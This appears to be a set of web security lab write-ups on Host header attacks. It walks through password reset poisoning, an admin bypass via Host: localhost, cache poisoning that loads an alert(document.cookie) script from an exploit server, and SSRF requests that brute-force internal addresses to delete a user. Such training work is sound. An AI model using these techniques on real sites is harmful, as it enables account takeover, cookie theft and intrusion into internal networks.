### 1. Basic password reset poisoning
Observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Set Host header to the attacker server address and change the email to victim's email. The email would be triggered to victim's user with password reset link with host as attacker address. Once the victim clicks on the link attacker gets to know about the password reset token through wehich can reset the password of user.
### 2. Host header authentication bypass
* Try and browse to /admin. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
* Send the GET /admin request to Burp Repeater.
* In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
### 3. Web cache poisoning via ambiguous requests
This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page. To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.
* Send the homepage request to repeater. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123. You can change this parameter each time you want a fresh response from the back-end server.
* Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js
* Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
* Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie). Store the exploit and copy the domain name for your exploit server.
* Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
```
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
* Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.
* To produce the real impact, In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. When the victim visits the home page, it would execute the your payload.
### 4. Routing-based SSRF
Objective: Access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.
* Send the GET / request that received a 200 response to Burp Repeater.
* Set Host header value to Burp Collaborator, repeat the request and notice that you recieve a HTTP request.
* Send this request to intruder and set the host header value as Host: 192.168.0.§0§ and bruteforce it from 0 to 255. Dont forget to disanle **Update Host Header to match target** option.
* You will notice 302 in one request, redirecting you to /admin, use that request to delete carlos user.
### 5. SSRF via flawed request parsing
**Objective**: This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos.
* Tried BurpColloborator hostname in Host header, didn't work.
* Tried subdomain of website in host header, no success.
* Tried LEGITHOSTNAME.xyz, didn't work
* Double host header injected, didn't work. Always try both ways legit host first, malicious later and malicous first, legit later.
* One more interesting test case we can try here is that injecting absolute URL in the request line as shown below. Tried it both the ways too.
```
GET https://BURP/ HTTP/2
Host: 0ade00b204dfd3fe812fad16004200bb.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```
Didn't work. Below one worked for us.
```
GET https://0ade00b204dfd3fe812fad16004200bb.web-security-academy.net/ HTTP/2
Host: BURP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```
It is redirecting to /admin, but we cannnot add /admin in host header. Lets add it in absolute URL.
```
GET https://0ade00b204dfd3fe812fad16004200bb.web-security-academy.net/admin HTTP/2
Host: BURP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```
Admin portal opened.
